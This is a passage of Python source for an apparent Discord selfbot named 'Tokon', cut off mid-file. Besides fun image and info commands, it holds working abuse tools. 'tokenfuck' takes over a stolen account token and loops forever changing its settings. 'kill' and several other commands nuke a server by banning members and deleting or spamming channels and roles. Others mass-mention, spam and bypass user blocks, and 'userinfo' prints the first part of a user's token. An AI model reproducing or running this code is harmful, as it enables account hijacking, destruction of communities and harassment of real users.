                    
        @Tokon.command()
        async def silentmute(ctx, user: discord.User, category=None):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if category == None:
                    if not Tokon.silentmute == user:
                        Tokon.silentmute = user
                        await ctx.send("Now muted " + str(Tokon.silentmute))
            else:
                await ctx.send('***Premium Invalid***')
                    

        @Tokon.command()
        async def unautomessage(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if Tokon.user is None:
                    await ctx.send("You weren't automessage anyone to begin with")
                    return
                Universe.print.normal(True, "Unautomessage " + str(Tokon.automessage))
                Tokon.automessage = None
                Tokon.automessagecontent = None
                Tokon.automessagedelay = None
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def automessage(ctx, user: discord.User, delay, *, msg):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                Tokon.automessage = user
                Tokon.automessagecontent = msg
                Tokon.automessagedelay = delay
                Universe.print.normal(True, "Now automessage on " + str(Tokon.automessage))
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def clear(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await ctx.send(f'{Universe.banner.invisiblechar}' + '\n' * 1400 + f'{Universe.banner.invisiblechar}')
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def thembed(ctx, *, message):
            await ctx.message.delete()
            content = on_theme(f"""```{Tokon.theme}
[{Tokon.author}]


{message}


[{Tokon.footer}]
```""")
            await ctx.send(content=content)

        @Tokon.command()
        async def sendall(ctx, *, message):
            await ctx.message.delete()
            try:
                channels = ctx.guild.text_channels
                for channel in channels:
                    await channel.send(message)
            except:
                pass

        @Tokon.command()
        async def genname(ctx):
            await ctx.message.delete()
            first, second = random.choices(ctx.guild.members, k=2)
            first = first.display_name[len(first.display_name) // 2:]
            second = second.display_name[:len(second.display_name) // 2]
            await ctx.send(discord.utils.escape_mentions(second + first))

        @Tokon.command()
        async def tweet(ctx, username: str = None, *, message: str = None):
            await ctx.message.delete()
            if username is None or message is None:
                await ctx.send("missing parameters")
                return
            async with aiohttp.ClientSession() as cs:
                async with cs.get(
                        f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
                    res = await r.json()
                    try:
                        async with aiohttp.ClientSession() as session:
                            async with session.get(str(res['message'])) as resp:
                                image = await resp.read()
                        with io.BytesIO(image) as file:
                            await ctx.send(file=discord.File(file, f"Tokon.png"))
                    except:
                        await ctx.send(res['message'])

        @Tokon.command()
        async def distort(ctx, user: discord.User = None):
            await ctx.message.delete()
            endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
            if user is None:
                avatar = str(ctx.author.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon.png"))
                except:
                    await ctx.send(res['message'])
            else:
                avatar = str(user.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon.png"))
                except:
                    await ctx.send(res['message'])

        @Tokon.command()
        async def read(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for guild in Tokon.guilds:
                    await guild.ack()
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def fry(ctx, user: discord.User = None):
            await ctx.message.delete()
            endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
            if user is None:
                avatar = str(ctx.author.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon.png"))
                except:
                    await ctx.send(res['message'])
            else:
                avatar = str(user.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon.png"))
                except:
                    await ctx.send(res['message'])

        @Tokon.command()
        async def blurpify(ctx, user: discord.User = None):
            await ctx.message.delete()
            endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
            if user is None:
                avatar = str(ctx.author.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon.png"))
                except:
                    await ctx.send(res['message'])
            else:
                avatar = str(user.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon.png"))
                except:
                    await ctx.send(res['message'])

        @Tokon.command()
        async def userpfp(ctx, *, user: discord.User = None):
            await ctx.message.delete()
            format = "gif"
            user = user or ctx.author
            if user.is_avatar_animated() != True:
                format = "png"
            avatar = user.avatar_url_as(format=format if format != "gif" else None)
            async with aiohttp.ClientSession() as session:
                async with session.get(str(avatar)) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Avatar.{format}"))

        @Tokon.command()
        async def userinfo(ctx, *, user: discord.User = None):
            await ctx.message.delete()
            if user is None:
                user = ctx.author
            premiumvalue = "no"
            presseur = premium_keys.get(f'status_{str(user.id)}')
            if presseur == "exact":
                premiumvalue = "yes"
            date_format = "%a, %d %b %Y %I:%M %p"
            def encodebase64(message):
                message_bytes = message.encode('ascii')
                base64_bytes = base64.b64encode(message_bytes)
                base64_message = base64_bytes.decode('ascii')
                message = base64_message
                return message
            id_1part = encodebase64(str(user.id))
            content = f"""```ini\n
            
[] 
[Registered] 
[ID] 
            """
            content = on_theme(f"""```{Tokon.theme}
[{Tokon.author}]


[Premium]          {Universe.banner.doublearrow} {premiumvalue}
[Registered]       {Universe.banner.doublearrow} {user.created_at.strftime(date_format)}
[ID]               {Universe.banner.doublearrow} {str(user.id)}
[First Part Token] {Universe.banner.doublearrow} {id_1part}
[Username]         {Universe.banner.doublearrow} {user.name}
[Hashtag]          {Universe.banner.doublearrow} {user.discriminator}


[{Tokon.footer}]
```""" + user.mention)
            await ctx.send(content=content)

        @Tokon.command()
        async def minesweeper(ctx, size: int = 5):
            await ctx.message.delete()
            size = max(min(size, 8), 2)
            bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
            is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
            has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
            message = "**Click to play**:\n"
            for y in range(size):
                for x in range(size):
                    tile = "||{}||".format(chr(11036))
                    if has_bomb(x, y):
                        tile = "||{}||".format(chr(128163))
                    else:
                        count = 0
                        for xmod, ymod in m_offets:
                            if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                                count += 1
                        if count != 0:
                            tile = "||{}||".format(m_numbers[count - 1])
                    message += tile
                message += "\n"
            await ctx.send(message)

        @Tokon.command()
        async def speak1337(ctx, *, text):
            await ctx.message.delete()
            text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
                .replace('E', '3').replace('i', '!').replace('I', '!') \
                .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
            await ctx.send(f'{text}')

        @Tokon.command()
        async def ghost(ctx):
            await ctx.message.delete()
            password = input(f'{Universe.print.input}Enter Password : ')
            with open('St/e1/Scookie/Transparent.png', 'rb') as f:
                try:
                    char = Universe.banner.invisiblechar * 5
                    await Tokon.user.edit(password=password, username="{char}", avatar=f.read())
                except discord.HTTPException as e:
                    Universe.print.error(e)

        @Tokon.command()
        async def setpfp(ctx, *, url):
            await ctx.message.delete()
            password = input(f'{Universe.print.input}Enter Password : ')
            with open('St/e1/Scookie/PFP-1.png', 'wb') as f:
                r = requests.get(url, stream=True)
                for block in r.iter_content(1024):
                    if not block:
                        break
                    f.write(block)
            try:
                Image.open('St/e1/Scookie/PFP-1.png').convert('RGB')
                with open('St/e1/Scookie/PFP-1.png', 'rb') as f:
                    await Tokon.user.edit(password=password, avatar=f.read())
            except discord.HTTPException as e:
                Universe.print.normal(True, e)

        @Tokon.command()
        async def topic(ctx):
            await ctx.message.delete()
            r = requests.get('https://www.conversationstarters.com/generator.php').content
            soup = bs4(r, 'html.parser')
            topic = soup.find(id="random").text
            await ctx.send(topic)

        @Tokon.command()
        async def hypesquad(ctx, house):
            await ctx.message.delete()
            request = requests.Session()
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            }
            if house == "bravery":
                payload = {'house_id': 1}
            elif house == "brilliance":
                payload = {'house_id': 2}
            elif house == "balance":
                payload = {'house_id': 3}
            elif house == "random":
                houses = [1, 2, 3]
                payload = {'house_id': random.choice(houses)}
            try:
                request.post('https://discordapp.com/api/v9/hypesquad/online', headers=headers, json=payload,
                             timeout=10)
            except Exception as e:
               Universe.print.error(e)

        @Tokon.command()
        async def tokenfuck(ctx, _token):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
                    'Content-Type': 'application/json',
                    'Authorization': _token,
                }
                request = requests.Session()
                payload = {
                    'theme': "light",
                    'locale': "ja",
                    'message_display_compact': False,
                    'inline_embed_media': False,
                    'inline_attachment_media': False,
                    'gif_auto_play': False,
                    'render_embeds': False,
                    'render_reactions': False,
                    'animate_emoji': False,
                    'convert_emoticons': False,
                    'enable_tts_command': False,
                    'explicit_content_filter': '0',
                    'status': "invisible"
                }
                guild = {
                    'channels': None,
                    'icon': None,
                    'name': "Tokon",
                    'region': "europe"
                }
                for _i in range(50):
                    requests.post('https://discordapp.com/api/v9/guilds', headers=headers, json=guild)
                while True:
                    try:
                        request.patch("https://discordapp.com/api/v9/users/@me/settings", headers=headers,
                                      json=payload)
                    except Exception as e:
                        Universe.print.error(e)
                    else:
                        break
                modes = cycle(["light", "dark"])
                statuses = cycle(["online", "idle", "dnd", "invisible"])
                while True:
                    setting = {
                        'theme': next(modes),
                        'locale': random.choice(locales),
                        'status': next(statuses)
                    }
                    while True:
                        try:
                            request.patch("https://discordapp.com/api/v9/users/@me/settings", headers=headers,
                                          json=setting,
                                          timeout=10)
                        except Exception as e:
                            Universe.print.error(e)
                        else:
                            break
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def blockmsg(ctx, userId, *, msg):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                token = Universe.crypt.decode("T")

                class BlockBypass:
                    def __init__(self, token, userId):
                        self.channelId = None
                        self.userId = userId
                        self.api = 'https://discord.com/api/v9/'
                        self.headers = {
                            'Authorization': token,
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
                        }

                    def generateChannel(self):
                        request = requests.post(f'{self.api}users/@me/channels', json={'recipients': [self.userId]}, headers=self.headers)

                        if request.status_code == 200:
                            self.channelId = request.json()['id']
                            self.main()

                    def sendMessage(self, message):
                        request = requests.post(f'{self.api}channels/{self.channelId}/messages', json={'content': message}, headers=self.headers)

                    def main(self):
                        content = msg

                        self.sendMessage(content)

                if __name__ == '__main__':
                    yesnt = BlockBypass(token, userId)
                    yesnt.generateChannel()
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def tokon(ctx):
            await ctx.message.delete()
            message = await ctx.send(content=":regional_indicator_t:")
            time.sleep(1)
            await message.edit(content=":regional_indicator_t::regional_indicator_o:")
            time.sleep(1)
            await message.edit(content=":regional_indicator_t::regional_indicator_o::regional_indicator_k:")
            time.sleep(1)
            await message.edit(content=":regional_indicator_t::regional_indicator_o::regional_indicator_k::regional_indicator_o:")
            time.sleep(1)
            await message.edit(content=":regional_indicator_t::regional_indicator_o::regional_indicator_k::regional_indicator_o::regional_indicator_n:")

        @Tokon.command()
        async def blueanim(ctx, msg):
            await ctx.message.delete()
            mess = f":regional_indicator_{msg[0]}:"
            message = await ctx.send(content=mess)
            time.sleep(1)
            for char in msg:
                if char == msg[0]:
                    pass
                if not char == msg[0] and not char == msg[-1]:
                    time.sleep(1)
                    await message.edit(content=mess + f':regional_indicator_{char}:')
                    mess += f':regional_indicator_{char}:'
                if char == msg[-1]:
                    time.sleep(1)
                    await message.edit(content=mess + f':regional_indicator_{msg[-1]}:')

        @Tokon.command()
        async def layeranim(ctx, *, msg):
            await ctx.message.delete()
            mess = f" `{msg[0]}` "
            message = await ctx.send(content=mess)
            time.sleep(1)
            for char in msg:
                if char == msg[0]:
                    pass
                if not char == msg[0] and not char == msg[-1]:
                    time.sleep(1)
                    await message.edit(content=mess + f' `{char}` ')
                    mess += f' `{char}` '
                if char == msg[-1]:
                    time.sleep(1)
                    await message.edit(content=mess + f' `{msg[-1]}` ')

        @Tokon.command()
        async def boldanim(ctx, *, msg):
            await ctx.message.delete()
            mess = f" **{msg[0]}** "
            message = await ctx.send(content=mess)
            time.sleep(1)
            for char in msg:
                if char == msg[0]:
                    pass
                if not char == msg[0] and not char == msg[-1]:
                    time.sleep(1)
                    await message.edit(content=mess + f' **{char}** ')
                    mess += f' **{char}** '
                if char == msg[-1]:
                    time.sleep(1)
                    await message.edit(content=mess + f' **{msg[-1]}** ')

        @Tokon.command()
        async def rep(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await ctx.send(f'{Tokon.lastcommand}')
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def antimassdm(ctx):
            await ctx.message.delete()

        @Tokon.command()
        async def copyserver(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await Tokon.create_guild(f'backup-{ctx.guild.name}')
                await asyncio.sleep(4)
                for g in Tokon.guilds:
                    if f'backup-{ctx.guild.name}' in g.name:
                        for c in g.channels:
                            await c.delete()
                        for cate in ctx.guild.categories:
                            x = await g.create_category(f"{cate.name}")
                            for chann in cate.channels:
                                if isinstance(chann, discord.VoiceChannel):
                                    await x.create_voice_channel(f"{chann}")
                                if isinstance(chann, discord.TextChannel):
                                    await x.create_text_channel(f"{chann}")
                        for role in ctx.guild.roles:
                            name = role.name
                            color = role.colour
                            perms = role.permissions
                            await g.create_role(name=name, permissions=perms, colour=color)
                try:
                    await g.edit(icon=ctx.guild.icon_url)
                except:
                    pass
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def massmention(ctx, *, message=None):
            await ctx.message.delete()
            if len(list(ctx.guild.members)) >= 50:
                userList = list(ctx.guild.members)
                random.shuffle(userList)
                sampling = random.choices(userList, k=50)
                if message is None:
                    post_message = ""
                    for user in sampling:
                        post_message += user.mention
                    await ctx.send(post_message)
                else:
                    post_message = message + "\n\n"
                    for user in sampling:
                        post_message += user.mention
                    await ctx.send(post_message)
            else:
                if message is None:
                    post_message = ""
                    for user in list(ctx.guild.members):
                        post_message += user.mention
                    await ctx.send(post_message)
                else:
                    post_message = message + "\n\n"
                    for user in list(ctx.guild.members):
                        post_message += user.mention
                    await ctx.send(post_message)

        @Tokon.command()
        async def kill(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for user in list(ctx.guild.members):
                    try:
                        await user.ban()
                    except:
                        pass
                for channel in list(ctx.guild.channels):
                    try:
                        await channel.delete()
                    except:
                        pass
                for role in list(ctx.guild.roles):
                    try:
                        await role.delete()
                    except:
                        pass
                try:
                    await ctx.guild.edit(
                        name=RandString(),
                        description="Tokon LOL",
                        reason="Tokon LOL",
                        icon=None,
                        banner=None
                    )
                except:
                    pass
                for _i in range(10):
                    await ctx.guild.create_text_channel(name="Tokon")
                for _i in range(10):
                    await ctx.guild.create_role(name="Tokon", color=RandomColor())
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def dynoban(ctx):
            await ctx.message.delete()
            for member in list(ctx.guild.members):
                message = await ctx.send("?ban " + member.mention)
                await message.delete()
                await asyncio.sleep(1.5)

        @Tokon.command()
        async def massrole(ctx):
            await ctx.message.delete()
            for _i in range(250):
                try:
                    await ctx.guild.create_role(name="Tokon", color=RandomColor())
                except:
                    return

        @Tokon.command()
        async def spamchannels(ctx):
            await ctx.message.delete()
            for _i in range(250):
                try:
                    await ctx.guild.create_text_channel(name="Tokon")
                except:
                    return

        @Tokon.command()
        async def delchannels(ctx):
            await ctx.message.delete()
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                except:
                    return

        @Tokon.command()
        async def delroles(ctx):
            await ctx.message.delete()
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                except:
                    pass


        @Tokon.command()
        async def spam(ctx, amount: int, *, message):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for i in range(amount):
                    await ctx.send(message)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def dm(ctx, user: discord.User, *, message):
            await ctx.message.delete()
            channel = await user.create_dm()
            await channel.send(message)

        @Tokon.command()
        async def getcolor(ctx, *, color: discord.Colour):
            await ctx.message.delete()
            file = io.BytesIO()
            Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
            file.seek(0)
            em = discord.Embed(color=color, title=f'{str(color)}')
            em.set_image(url='attachment://color.png')
            await ctx.send(file=discord.File(file, 'color.png'), embed=em)

        @Tokon.command()
        async def ping(ctx):
            await ctx.message.delete()
            before = time.monotonic()
            ping = (time.monotonic() - before) * 1000
            await ctx.send(content=f"{int(ping)} ms")

        @Tokon.command()
        async def serverinfo(ctx):
            await ctx.message.delete()
            date_format = "%a, %d %b %Y %I:%M %p"
            embed = discord.Embed(title=f"{ctx.guild.name}",
                                  description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                                  timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
            embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
            embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
            embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
            embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
            embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
            await ctx.send(embed=embed)

        @Tokon.command()
        async def wizz(ctx):
            await ctx.message.delete()
            if isinstance(ctx.message.channel, discord.TextChannel):
                print("hi")
                initial = random.randrange(0, 60)
                message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting itss...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
            elif isinstance(ctx.message.channel, discord.DMChannel):
                initial = random.randrange(1, 60)
                message = await ctx.send(
                    f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
            elif isinstance(ctx.message.channel, discord.GroupChannel):
                initial = random.randrange(1, 60)
                message = await ctx.send(
                    f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
                await asyncio.sleep(1)
                await message.edit(
                    content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")

        @Tokon.command()
        async def serverpfp(ctx):
            await ctx.message.delete()
            await ctx.send(ctx.guild.icon_url)

        @Tokon.command()
        async def serverbanner(ctx):
            await ctx.message.delete()
            em = discord.Embed(title=ctx.guild.name)
            em.set_image(url=ctx.guild.banner_url)
            await ctx.send(embed=em)

        @Tokon.command()
        async def renamechannels(ctx, *, name):
            await ctx.message.delete()
            for channel in ctx.guild.channels:
                await channel.edit(name=name)

        @Tokon.command()
        async def servername(ctx, *, name):
            await ctx.message.delete()
            await ctx.guild.edit(name=name)

        @Tokon.command()
        async def nickall(ctx, nickname):
            await ctx.message.delete()
            for user in list(ctx.guild.members):
                try:
                    await user.edit(nick=nickname)
                except:
                    pass

        @Tokon.command()
        async def youtube(ctx, *, search):
            await ctx.message.delete()
            query_string = parse.urlencode({'search_query': search})
            html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
            search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
            await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])

        @Tokon.command()
        async def prefix(ctx, prefix):
            await ctx.message.delete()
            Tokon.command_prefix = str(prefix)
            Universe.clear()
            startprint()

        @Tokon.command()
        async def theme(ctx, bababoi):
            await ctx.message.delete()
            if bababoi == "rewow":
                Tokon.theme = "diff"
                Tokon.prevent = "diff"
            elif bababoi == "blor":
                Tokon.theme = "css"
                Tokon.prevent = "ini"
            elif bababoi == "inblor":
                Tokon.theme = "ini"
                Tokon.prevent = "css"
            elif bababoi == "yewow":
                Tokon.theme = "fix"
                Tokon.prevent = "fix"
            else:
                Universe.print.error("This Theme Doesn't Exist !")

        @Tokon.command()
        async def themes(ctx):
            content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  {Universe.banner.doublearrow} is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[theme yewow]   
[theme rewow]    
     
[theme blor]      
[theme inblor]        


[{Tokon.footer}]
```""")
            await ctx.message.delete()
            await ctx.send(content=content)
        @Tokon.command()
        async def footer(ctx, link):
            if link == None:
                Tokon.thumbnail = ""
            else:
                Tokon.thumbnail = link
            content = on_theme(f"```Thumbnail Changed ! ```")
            await ctx.message.delete()
            await ctx.send(content=content)

        @Tokon.command()
        async def author(ctx, link):
            if link == None:
                Tokon.author = ""
            else:
                Tokon.author = link
            content = on_theme(f"```Author Changed ! ```")
            await ctx.message.delete()
            await ctx.send(content=content)

        @Tokon.command()
        async def abc(ctx):
            await ctx.message.delete()
            ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
                   't',
                   'u',
                   'v', 'w', 'x', 'y', 'z']
            message = await ctx.send(ABC[0])
            await asyncio.sleep(2)
            for _next in ABC[1:]:
                await message.edit(content=_next)
                await asyncio.sleep(2)

        @Tokon.command()
        async def count100(ctx):
            await ctx.message.delete()
            message = ctx.send("Starting count to 100")
            await asyncio.sleep(2)
            for _ in range(100):
                await message.edit(content=_)
                await asyncio.sleep(2)

        @Tokon.command()
        async def bitcoin(ctx):
            await ctx.message.delete()
            r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
            r = r.json()
            usd = r['USD']
            eur = r['EUR']
            em = discord.Embed(description=f'USD: `{str(usd)}`\nEUR: `{str(eur)}`')
            em.set_author(name='Bitcoin',
                          icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
            await ctx.send(embed=em)

        @Tokon.command()
        async def etherium(ctx):
            await ctx.message.delete()
            r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
            r = r.json()
            usd = r['USD']
            eur = r['EUR']
            em = discord.Embed(description=f'USD: `{str(usd)}`\nEUR: `{str(eur)}`')
            em.set_author(name='Ethereum',
                          icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
            await ctx.send(embed=em)

        @Tokon.command()
        async def hastebin(ctx, *, message):
            await ctx.message.delete()
            r = requests.post("https://hastebin.com/documents", data=message).json()
            await ctx.send(f"<https://hastebin.com/{r['key']}>")

        @Tokon.command()
        async def ascii(ctx, *, text):
            await ctx.message.delete()
            r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
            if len('```' + r + '```') > 2000:
                return
            await ctx.send(f"```{r}```")
            
        @Tokon.command()
        async def acceptfriends(ctx):
            await ctx.message.delete()
            for relationship in Tokon.user.relationships:
                if relationship == discord.RelationshipType.incoming_request:
                    await relationship.accept()

        @Tokon.command()
        async def ignorefriends(ctx):
            await ctx.message.delete()
            for relationship in Tokon.user.relationships:
                if relationship is discord.RelationshipType.incoming_request:
                    relationship.delete()

        @Tokon.command()
        async def delfriends(ctx):
            await ctx.message.delete()
            for relationship in Tokon.user.relationships:
                if relationship is discord.RelationshipType.friend:
                    await relationship.delete()

        @Tokon.command()
